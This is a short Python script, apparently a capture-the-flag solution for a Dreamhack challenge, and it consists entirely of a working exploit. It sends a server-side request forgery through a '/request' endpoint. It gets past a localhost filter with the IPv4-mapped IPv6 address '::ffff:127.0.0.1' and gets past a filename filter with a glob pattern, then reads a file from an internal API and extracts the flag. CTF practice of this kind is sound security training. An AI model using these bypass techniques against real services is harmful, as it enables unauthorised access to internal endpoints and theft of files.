import requests
import html
import re

url = 'http://host8.dreamhack.games:24561/'
s = requests.Session()

res = s.post(f'{url}/request', data={
    'host': '::ffff:127.0.0.1',
    'port': '8080',
    'path': 'api/read?filename=/fla[g][[:punct:]]txt'
})

flag = re.findall(r'(DH{.+?})', html.unescape(res.text))[0].strip()
print("Flag:", flag)